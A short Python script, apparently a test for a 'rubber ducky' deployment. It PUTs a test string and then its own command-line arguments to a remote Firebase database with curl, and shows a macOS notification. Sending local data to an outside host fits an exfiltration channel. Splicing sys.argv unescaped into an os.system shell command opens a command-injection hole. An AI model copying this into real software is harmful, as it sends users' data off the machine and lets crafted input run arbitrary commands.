import sys
import os

def main():
    # sys.argv

    os.system("curl -X PUT -d '\"test\"' https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users/011935/out.json")

    os.system("osascript -e 'display notification \"hello\"'")
    os.system(f"curl -X PUT -d '\"{sys.argv}\"' https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users/011935/out.json")

if __name__ == "__main__":
    main()
